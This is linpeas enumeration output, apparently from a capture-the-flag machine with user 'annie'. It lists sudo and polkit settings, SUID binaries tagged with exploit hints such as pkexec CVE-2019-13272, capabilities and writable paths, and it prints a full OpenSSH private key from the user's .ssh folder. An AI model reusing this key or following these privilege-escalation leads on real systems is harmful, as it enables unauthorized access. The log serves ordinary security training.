╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#users                                                      
uid=1000(annie) gid=1000(annie) groups=1000(annie),24(cdrom),27(sudo),30(dip),46(plugdev),111(lpadmin),112(sambashare)        

╔══════════╣ Do I have PGP keys?
/usr/bin/gpg                                                                                                                  
netpgpkeys Not Found
netpgp Not Found                                                                                                              
                                                                                                                              
╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid                                              
                                                                                                                              
╔══════════╣ Checking sudo tokens
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#reusing-sudo-tokens                                        
ptrace protection is enabled (1)                                                                                              

╔══════════╣ Checking Pkexec policy
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe#pe-method-2                    
                                                                                                                              
[Configuration]
AdminIdentities=unix-user:0
[Configuration]
AdminIdentities=unix-group:sudo;unix-group:admin

╔══════════╣ Superusers
root:x:0:0:root:/root:/bin/bash                                                                                               

╔══════════╣ Users with console
annie:x:1000:1000:Annie Dash,,,:/home/annie:/bin/bash                                                                         
root:x:0:0:root:/root:/bin/bash

╔══════════╣ All users & groups
uid=0(root) gid=0(root) groups=0(root)                                                                                        
uid=1000(annie) gid=1000(annie) groups=1000(annie),24(cdrom),27(sudo),30(dip),46(plugdev),111(lpadmin),112(sambashare)
uid=100(systemd-network) gid=102(systemd-network) groups=102(systemd-network)
uid=101(systemd-resolve) gid=103(systemd-resolve) groups=103(systemd-resolve)
uid=102(syslog) gid=106(syslog) groups=106(syslog),4(adm)
uid=103(messagebus) gid=107(messagebus) groups=107(messagebus)
uid=104(_apt) gid=65534(nogroup) groups=65534(nogroup)
uid=105(uuidd) gid=109(uuidd) groups=109(uuidd)
uid=106(cups-pk-helper) gid=111(lpadmin) groups=111(lpadmin)
uid=107(rtkit) gid=114(rtkit) groups=114(rtkit)
uid=108(dnsmasq) gid=65534(nogroup) groups=65534(nogroup)
uid=109(usbmux) gid=46(plugdev) groups=46(plugdev)
uid=10(uucp) gid=10(uucp) groups=10(uucp)
uid=110(avahi) gid=116(avahi) groups=116(avahi)
uid=111(pulse) gid=118(pulse) groups=118(pulse),29(audio)
uid=112(colord) gid=120(colord) groups=120(colord)
uid=113(saned) gid=121(saned) groups=121(saned),117(scanner)
uid=114(geoclue) gid=122(geoclue) groups=122(geoclue)
uid=115(gdm) gid=123(gdm) groups=123(gdm)
uid=116(sshd) gid=65534(nogroup) groups=65534(nogroup)
uid=13(proxy) gid=13(proxy) groups=13(proxy)
uid=1(daemon[0m) gid=1(daemon[0m) groups=1(daemon[0m)
uid=2(bin) gid=2(bin) groups=2(bin)
uid=33(www-data) gid=33(www-data) groups=33(www-data)
uid=34(backup) gid=34(backup) groups=34(backup)
uid=38(list) gid=38(list) groups=38(list)
uid=39(irc) gid=39(irc) groups=39(irc)
uid=3(sys) gid=3(sys) groups=3(sys)
uid=41(gnats) gid=41(gnats) groups=41(gnats)
uid=4(sync) gid=65534(nogroup) groups=65534(nogroup)
uid=5(games) gid=60(games) groups=60(games)
uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
uid=6(man) gid=12(man) groups=12(man)
uid=7(lp) gid=7(lp) groups=7(lp)
uid=8(mail) gid=8(mail) groups=8(mail)
uid=9(news) gid=9(news) groups=9(news)

╔══════════╣ Login now
 07:10:46 up  3:03,  1 user,  load average: 0.30, 0.07, 0.02                                                                  
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
annie    pts/0    10.18.21.236     04:41   19.00s  0.21s  0.00s sh linpeas.sh

╔══════════╣ Last logons
annie    pts/0        Wed Mar 23 13:32:18 2022 - Wed Mar 23 13:33:37 2022  (00:01)     192.168.58.1                           
reboot   system boot  Wed Mar 23 13:32:03 2022 - Wed Mar 23 14:10:02 2022  (00:37)     0.0.0.0
annie    pts/1        Wed Mar 23 13:18:48 2022 - Wed Mar 23 13:31:58 2022  (00:13)     192.168.58.1
annie    pts/1        Wed Mar 23 13:10:17 2022 - Wed Mar 23 13:14:01 2022  (00:03)     192.168.58.1
annie    :1           Wed Mar 23 13:00:07 2022 - Wed Mar 23 13:31:40 2022  (00:31)     0.0.0.0
reboot   system boot  Wed Mar 23 12:59:51 2022 - Wed Mar 23 13:31:59 2022  (00:32)     0.0.0.0
annie    tty1         Wed Mar 23 13:25:40 2022 - down                      (-00:25)    0.0.0.0
reboot   system boot  Wed Mar 23 13:23:20 2022 - Wed Mar 23 12:59:47 2022  (-00:23)    0.0.0.0

wtmp begins Wed Mar 23 13:23:20 2022

╔══════════╣ Last time logon each user
Username         Port     From             Latest                                                                             
annie            pts/0    10.18.21.236     Tue Jun 18 04:41:41 -0700 2024

╔══════════╣ Do not forget to test 'su' as any other user with shell: without password and with their names as password (I don't do it in FAST mode...)                                                                                                     
                                                                                                                              
╔══════════╣ Do not forget to execute 'sudo -l' without password or with valid password (if you know it)!!
                                                                                                                              


                             ╔══════════════════════╗
═════════════════════════════╣ Software Information ╠═════════════════════════════                                            
                             ╚══════════════════════╝                                                                         
╔══════════╣ Useful software
/usr/bin/base64                                                                                                               
/usr/bin/gcc
/usr/bin/make
/bin/nc
/bin/netcat
/usr/bin/perl
/bin/ping
/usr/bin/python3
/usr/bin/python3.6
/usr/bin/sudo
/usr/bin/wget
/usr/bin/xterm

╔══════════╣ Installed Compilers
ii  gcc                                    4:7.4.0-1ubuntu2.3                              amd64        GNU C compiler        
ii  gcc-7                                  7.5.0-3ubuntu1~18.04                            amd64        GNU C compiler
/usr/bin/gcc

╔══════════╣ Searching mysql credentials and exec
                                                                                                                              
╔══════════╣ Analyzing Rsync Files (limit 70)
-rw-r--r-- 1 root root 1044 Feb  8  2022 /usr/share/doc/rsync/examples/rsyncd.conf                                            
[ftp]
        comment = public archive
        path = /var/www/pub
        use chroot = yes
        lock file = /var/lock/rsyncd
        read only = yes
        list = yes
        uid = nobody
        gid = nogroup
        strict modes = yes
        ignore errors = no
        ignore nonreadable = yes
        transfer logging = no
        timeout = 600
        refuse options = checksum dry-run
        dont compress = *.gz *.tgz *.zip *.z *.rpm *.deb *.iso *.bz2 *.tbz


╔══════════╣ Analyzing Wifi Connections Files (limit 70)
drwxr-xr-x 2 root root 4096 Feb 18  2020 /etc/NetworkManager/system-connections                                               
drwxr-xr-x 2 root root 4096 Feb 18  2020 /etc/NetworkManager/system-connections


╔══════════╣ Analyzing Ldap Files (limit 70)
The password hash is from the {SSHA} to 'structural'                                                                          
drwxr-xr-x 2 root root 4096 Mar 23  2022 /etc/ldap


╔══════════╣ Searching ssl/ssh files
╔══════════╣ Analyzing SSH Files (limit 70)                                                                                   
                                                                                                                              
-rw-rw-r-- 1 annie annie 2635 Mar 23  2022 /home/annie/.ssh/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
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
b1Da9w==
-----END OPENSSH PRIVATE KEY-----



-rw------- 1 annie annie 553 Mar 23  2022 /home/annie/.ssh/authorized_keys
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDRKiYi/W9WQHbkLLwpAteIPK78mlrW1vSC7aX2iqWPBfxcgJC9JCzXai7T7etRxNX7EDYUIgCRJrixd9jVjqA2mtqTnqk6LmUP9r1pB+X8c94uEK6KT58XvDul4uC/JQIGun81lRsBVeB066tt+oUubaTo78aryPhYoT/4IQZOwYBeRyGr6crE7Pl/1y4oLo8EAllIX1U0v049EHMLENbEA4cAxavXWx+z5TArbSGzH+VCDHZVtp2TJHExKz3NsC0sY7KWpExZ3DuwgUCoeokDlPwX6yj/p6b/IYUfPM8CWdj4mIv81+QC8W95y7iO0pVXKops0segA3Yl5m+q2+P1FZ8GpY8tUzdiBm96aEpZrnWCTENYKH6NHUlFJ0UslZl+EN3cdNCh15oxk7AyLOMGSBKolRlrhtXh/QycbSZj6isueZc/DcxjiWxsdME5Pgx7Frj5hBXZFYSD0rc+z8m8l5raBKRe6CURl7xfEDz98QVvLObDQwKsnWENRaQaH40=

-rw-r--r-- 1 root root 173 Mar 23  2022 /etc/ssh/ssh_host_ecdsa_key.pub
-rw-r--r-- 1 root root 93 Mar 23  2022 /etc/ssh/ssh_host_ed25519_key.pub
-rw-r--r-- 1 root root 393 Mar 23  2022 /etc/ssh/ssh_host_rsa_key.pub

PubkeyAuthentication yes
PasswordAuthentication no
PermitEmptyPasswords no
ChallengeResponseAuthentication no
UsePAM yes

══╣ Possible private SSH keys were found!
/etc/anydesk/service.conf
/home/annie/.anydesk/service.conf
/home/annie/.ssh/id_rsa

══╣ Some certificates were found (out limited):
/etc/ssl/certs/ACCVRAIZ1.pem                                                                                                  
/etc/ssl/certs/AC_RAIZ_FNMT-RCM.pem
/etc/ssl/certs/Actalis_Authentication_Root_CA.pem
/etc/ssl/certs/AffirmTrust_Commercial.pem
/etc/ssl/certs/AffirmTrust_Networking.pem
/etc/ssl/certs/AffirmTrust_Premium_ECC.pem
/etc/ssl/certs/AffirmTrust_Premium.pem
/etc/ssl/certs/Amazon_Root_CA_1.pem
/etc/ssl/certs/Amazon_Root_CA_2.pem
/etc/ssl/certs/Amazon_Root_CA_3.pem
/etc/ssl/certs/Amazon_Root_CA_4.pem
/etc/ssl/certs/Atos_TrustedRoot_2011.pem
/etc/ssl/certs/Autoridad_de_Certificacion_Firmaprofesional_CIF_A62634068.pem
/etc/ssl/certs/Baltimore_CyberTrust_Root.pem
/etc/ssl/certs/Buypass_Class_2_Root_CA.pem
/etc/ssl/certs/Buypass_Class_3_Root_CA.pem
/etc/ssl/certs/ca-certificates.crt
/etc/ssl/certs/CA_Disig_Root_R2.pem
/etc/ssl/certs/Certigna.pem
/etc/ssl/certs/Certigna_Root_CA.pem
838PSTORAGE_CERTSBIN

══╣ Some home ssh config file was found
/usr/share/openssh/sshd_config                                                                                                
ChallengeResponseAuthentication no
UsePAM yes
X11Forwarding yes
PrintMotd no
AcceptEnv LANG LC_*
Subsystem       sftp    /usr/lib/openssh/sftp-server

══╣ /etc/hosts.allow file found, trying to read the rules:
/etc/hosts.allow                                                                                                              


Searching inside /etc/ssh/ssh_config for interesting info
Host *
    SendEnv LANG LC_*
    HashKnownHosts yes
    GSSAPIAuthentication yes

╔══════════╣ Analyzing PAM Auth Files (limit 70)
drwxr-xr-x 2 root root 4096 Mar 23  2022 /etc/pam.d                                                                           
-rw-r--r-- 1 root root 2133 Mar  2  2020 /etc/pam.d/sshd
account    required     pam_nologin.so
session [success=ok ignore=ignore module_unknown=ignore default=bad]        pam_selinux.so close
session    required     pam_loginuid.so
session    optional     pam_keyinit.so force revoke
session    optional     pam_motd.so  motd=/run/motd.dynamic
session    optional     pam_motd.so noupdate
session    optional     pam_mail.so standard noenv # [1]
session    required     pam_limits.so
session    required     pam_env.so # [1]
session    required     pam_env.so user_readenv=1 envfile=/etc/default/locale
session [success=ok ignore=ignore module_unknown=ignore default=bad]        pam_selinux.so open




╔══════════╣ Analyzing Keyring Files (limit 70)
drwx------ 2 annie annie 4096 Mar 23  2022 /home/annie/.local/share/keyrings                                                  
drwxr-xr-x 2 root root 4096 Mar 23  2022 /usr/share/keyrings

-rw------- 1 annie annie 105 Mar 23  2022 /home/annie/.local/share/keyrings/login.keyring

-rw------- 1 annie annie 207 Mar 23  2022 /home/annie/.local/share/keyrings/user.keystore


╔══════════╣ Searching uncommon passwd files (splunk)
passwd file: /etc/pam.d/passwd                                                                                                
passwd file: /etc/passwd
passwd file: /usr/share/bash-completion/completions/passwd
passwd file: /usr/share/lintian/overrides/passwd

╔══════════╣ Analyzing PGP-GPG Files (limit 70)
/usr/bin/gpg                                                                                                                  
netpgpkeys Not Found
netpgp Not Found                                                                                                              
                                                                                                                              
-rw-r--r-- 1 root root 2796 Mar 29  2021 /etc/apt/trusted.gpg.d/ubuntu-keyring-2012-archive.gpg
-rw-r--r-- 1 root root 2794 Mar 29  2021 /etc/apt/trusted.gpg.d/ubuntu-keyring-2012-cdimage.gpg
-rw-r--r-- 1 root root 1733 Mar 29  2021 /etc/apt/trusted.gpg.d/ubuntu-keyring-2018-archive.gpg
-rw------- 1 annie annie 1200 Mar 23  2022 /home/annie/.gnupg/trustdb.gpg
-rw-r--r-- 1 root root 3267 Jan 16  2021 /usr/share/gnupg/distsigkey.gpg
-rw-r--r-- 1 root root 2247 Jan 20  2022 /usr/share/keyrings/ubuntu-advantage-cc-eal.gpg
-rw-r--r-- 1 root root 2274 Jan 20  2022 /usr/share/keyrings/ubuntu-advantage-cis.gpg
-rw-r--r-- 1 root root 2236 Jan 20  2022 /usr/share/keyrings/ubuntu-advantage-esm-apps.gpg
-rw-r--r-- 1 root root 2264 Jan 20  2022 /usr/share/keyrings/ubuntu-advantage-esm-infra-trusty.gpg
-rw-r--r-- 1 root root 2275 Jan 20  2022 /usr/share/keyrings/ubuntu-advantage-fips.gpg
-rw-r--r-- 1 root root 2235 Jan 20  2022 /usr/share/keyrings/ubuntu-advantage-ros.gpg
-rw-r--r-- 1 root root 7399 Sep 17  2018 /usr/share/keyrings/ubuntu-archive-keyring.gpg
-rw-r--r-- 1 root root 6713 Oct 27  2016 /usr/share/keyrings/ubuntu-archive-removed-keys.gpg
-rw-r--r-- 1 root root 4097 Feb  6  2018 /usr/share/keyrings/ubuntu-cloudimage-keyring.gpg
-rw-r--r-- 1 root root 0 Jan 17  2018 /usr/share/keyrings/ubuntu-cloudimage-removed-keys.gpg
-rw-r--r-- 1 root root 1227 May 27  2010 /usr/share/keyrings/ubuntu-master-keyring.gpg
-rw-r--r-- 1 root root 2867 Feb 21  2018 /usr/share/popularity-contest/debian-popcon.gpg

drwx------ 3 annie annie 4096 Mar 23  2022 /home/annie/.gnupg
drwx------ 3 gdm gdm 4096 Mar 23  2022 /var/lib/gdm3/.gnupg


╔══════════╣ Analyzing Postfix Files (limit 70)
-rw-r--r-- 1 root root 675 Apr  1  2018 /usr/share/bash-completion/completions/postfix                                        


╔══════════╣ Analyzing DNS Files (limit 70)
-rw-r--r-- 1 root root 856 Apr  1  2018 /usr/share/bash-completion/completions/bind                                           
-rw-r--r-- 1 root root 856 Apr  1  2018 /usr/share/bash-completion/completions/bind




╔══════════╣ Analyzing Other Interesting Files (limit 70)
-rw-r--r-- 1 root root 3771 Apr  4  2018 /etc/skel/.bashrc                                                                    
-rw-r--r-- 1 annie annie 3771 Mar 23  2022 /home/annie/.bashrc



-rw------- 1 annie annie 32 Jun 18 06:03 /home/annie/.lesshst


-rw-r--r-- 1 root root 807 Apr  4  2018 /etc/skel/.profile
-rw-r--r-- 1 annie annie 807 Mar 23  2022 /home/annie/.profile



-rw-r--r-- 1 annie annie 0 Mar 23  2022 /home/annie/.sudo_as_admin_successful



                      ╔════════════════════════════════════╗
══════════════════════╣ Files with Interesting Permissions ╠══════════════════════                                            
                      ╚════════════════════════════════════╝                                                                  
╔══════════╣ SUID - Check easy privesc, exploits and write perms
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid                                              
-rwsr-xr-x 1 root root 10K Nov 16  2017 /sbin/setcap (Unknown SUID binary!)                                                   
-rwsr-xr-x 1 root root 43K Sep 16  2020 /bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
-rwsr-xr-x 1 root root 63K Jun 28  2019 /bin/ping
-rwsr-xr-x 1 root root 44K Jan 25  2022 /bin/su
-rwsr-xr-x 1 root root 31K Aug 11  2016 /bin/fusermount
-rwsr-xr-x 1 root root 27K Sep 16  2020 /bin/umount  --->  BSD/Linux(08-1996)
-rwsr-xr-- 1 root dip 370K Jul 23  2020 /usr/sbin/pppd  --->  Apple_Mac_OSX_10.4.8(05-2007)
-rwsr-xr-x 1 root root 10K Mar 27  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root 427K Mar  2  2020 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 14K Jan 12  2022 /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-sr-x 1 root root 10K Dec 14  2021 /usr/lib/xorg/Xorg.wrap
-rwsr-xr-- 1 root messagebus 42K Jun 11  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 22K Jun 28  2019 /usr/bin/arping
-rwsr-xr-x 1 root root 40K Jan 25  2022 /usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root root 146K Jan 19  2021 /usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
-rwsr-xr-x 1 root root 19K Jun 28  2019 /usr/bin/traceroute6.iputils
-rwsr-xr-x 1 root root 75K Jan 25  2022 /usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 1 root root 75K Jan 25  2022 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 44K Jan 25  2022 /usr/bin/chsh
-rwsr-xr-x 1 root root 59K Jan 25  2022 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)                                                                                                      
-rwsr-xr-x 1 root root 22K Jan 12  2022 /usr/bin/pkexec  --->  Linux4.10_to_5.1.17(CVE-2019-13272)/rhel_6(CVE-2011-1485)

╔══════════╣ SGID
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid                                              
-rwxr-sr-x 1 root shadow 34K Apr  8  2021 /sbin/pam_extrausers_chkpwd                                                         
-rwxr-sr-x 1 root shadow 34K Apr  8  2021 /sbin/unix_chkpwd
-rwxr-sr-x 1 root utmp 10K Mar 11  2016 /usr/lib/x86_64-linux-gnu/utempter/utempter
-rwsr-sr-x 1 root root 10K Dec 14  2021 /usr/lib/xorg/Xorg.wrap
-rwxr-sr-x 1 root mail 14K Jul  8  2020 /usr/lib/evolution/camel-lock-helper-1.2
-rwxr-sr-x 1 root crontab 39K Nov 15  2017 /usr/bin/crontab
-rwxr-sr-x 1 root shadow 71K Jan 25  2022 /usr/bin/chage
-rwxr-sr-x 1 root ssh 355K Mar  2  2020 /usr/bin/ssh-agent
-rwxr-sr-x 1 root tty 31K Sep 16  2020 /usr/bin/wall
-rwxr-sr-x 1 root mlocate 43K Mar  1  2018 /usr/bin/mlocate
-rwxr-sr-x 1 root tty 14K Jan 17  2018 /usr/bin/bsd-write
-rwxr-sr-x 1 root shadow 23K Jan 25  2022 /usr/bin/expiry

╔══════════╣ Checking misconfigurations of ld.so
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#ld.so                                                      
/etc/ld.so.conf                                                                                                               
Content of /etc/ld.so.conf:                                                                                                   
include /etc/ld.so.conf.d/*.conf

/etc/ld.so.conf.d
  /etc/ld.so.conf.d/libc.conf                                                                                                 
  - /usr/local/lib                                                                                                            
  /etc/ld.so.conf.d/x86_64-linux-gnu.conf
  - /usr/local/lib/x86_64-linux-gnu                                                                                           
  - /lib/x86_64-linux-gnu
  - /usr/lib/x86_64-linux-gnu

/etc/ld.so.preload
╔══════════╣ Capabilities                                                                                                     
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#capabilities                                               
══╣ Current shell capabilities                                                                                                
CapInh:  0x0000000000000000=                                                                                                  
CapPrm:  0x0000000000000000=
CapEff:  0x0000000000000000=
CapBnd:  0x0000003fffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read
CapAmb:  0x0000000000000000=

══╣ Parent process capabilities
CapInh:  0x0000000000000000=                                                                                                  
CapPrm:  0x0000000000000000=
CapEff:  0x0000000000000000=
CapBnd:  0x0000003fffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read
CapAmb:  0x0000000000000000=


Files with capabilities (limited to 50):
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/gnome-keyring-daemon = cap_ipc_lock+ep

╔══════════╣ Users with capabilities
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#capabilities                                               
                                                                                                                              
╔══════════╣ AppArmor binary profiles
-rw-r--r-- 1 root root 3194 Mar 26  2018 sbin.dhclient                                                                        
-rw-r--r-- 1 root root 2857 Apr  7  2018 usr.bin.man
-rw-r--r-- 1 root root  643 Jan 16  2018 usr.sbin.ippusbxd
-rw-r--r-- 1 root root 1550 Apr 24  2018 usr.sbin.rsyslogd
-rw-r--r-- 1 root root 1353 Mar 31  2018 usr.sbin.tcpdump

╔══════════╣ Files with ACLs (limited to 50)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#acls                                                       
files with acls in searched folders Not Found                                                                                 
                                                                                                                              
╔══════════╣ Files (scripts) in /etc/profile.d/
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#profiles-files                                             
total 32                                                                                                                      
drwxr-xr-x   2 root root 4096 Mar 23  2022 .
drwxr-xr-x 109 root root 4096 May 14  2022 ..
-rw-r--r--   1 root root   96 Sep 27  2019 01-locale-fix.sh
-rw-r--r--   1 root root  664 Apr  1  2018 bash_completion.sh
-rw-r--r--   1 root root 1003 Dec 29  2015 cedilla-portuguese.sh
-rw-r--r--   1 root root  652 Apr  3  2019 input-method-config.sh
-rw-r--r--   1 root root 1941 Jul 16  2018 vte-2.91.sh
-rw-r--r--   1 root root  954 May  2  2018 xdg_dirs_desktop_session.sh

╔══════════╣ Permissions in init, init.d, systemd, and rc.d
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#init-init-d-systemd-and-rc-d                               
                                                                                                                              
═╣ Hashes inside passwd file? ........... No
═╣ Writable passwd file? ................ No                                                                                  
═╣ Credentials in fstab/mtab? ........... No                                                                                  
═╣ Can I read shadow files? ............. No                                                                                  
═╣ Can I read shadow plists? ............ No                                                                                  
═╣ Can I write shadow plists? ........... No                                                                                  
═╣ Can I read opasswd file? ............. No                                                                                  
═╣ Can I write in network-scripts? ...... No                                                                                  
═╣ Can I read root folder? .............. No                                                                                  
                                                                                                                              
╔══════════╣ Searching root files in home dirs (limit 30)
/home/                                                                                                                        
/home/annie/.selected_editor
/root/

╔══════════╣ Searching folders owned by me containing others files on it (limit 100)
-rw-r--r-- 1 root root 66 Mar 23  2022 /home/annie/.selected_editor                                                           

╔══════════╣ Readable files belonging to root and readable by me but not world readable
-rw-r----- 1 root dip 656 Mar 23  2022 /etc/chatscripts/provider                                                              
-rw-r----- 1 root dip 1093 Mar 23  2022 /etc/ppp/peers/provider

╔══════════╣ Interesting writable files owned by me or writable by everyone (not in Home) (max 500)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-files                                             
/dev/mqueue                                                                                                                   
/dev/shm
/dev/shm/ad_552_gsystem_evt_event_mtx
/dev/shm/ad_552_gsystem_mtx
/dev/shm/ad_552_gsystem_shm
/dev/shm/ad_552_lsystem_evt_event_mtx
/dev/shm/ad_552_lsystem_mtx
#)You_can_write_even_more_files_inside_last_directory

/home/annie
/run/lock
/run/user/1000
/run/user/1000/gnupg
/run/user/1000/systemd
/tmp
/tmp/anydesk
/tmp/.font-unix
/tmp/.ICE-unix
/tmp/.Test-unix
/tmp/.X11-unix
#)You_can_write_even_more_files_inside_last_directory

/var/crash
/var/lib/gdm3/.anydesk/anydesk.trace
/var/log/anydesk.trace
/var/tmp

╔══════════╣ Interesting GROUP writable files (not in Home) (max 500)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-files                                             
  Group annie:                                                                                                                
/dev/shm/ad_mailbox_792_0_1_evt_event_mtx                                                                                     
/dev/shm/ad_mailbox_792_0_1_mtx
/dev/shm/ad_mailbox_792_0_1_shm
/dev/shm/ad_mailbox_792_0_0_evt_event_mtx
/dev/shm/ad_mailbox_792_0_0_mtx
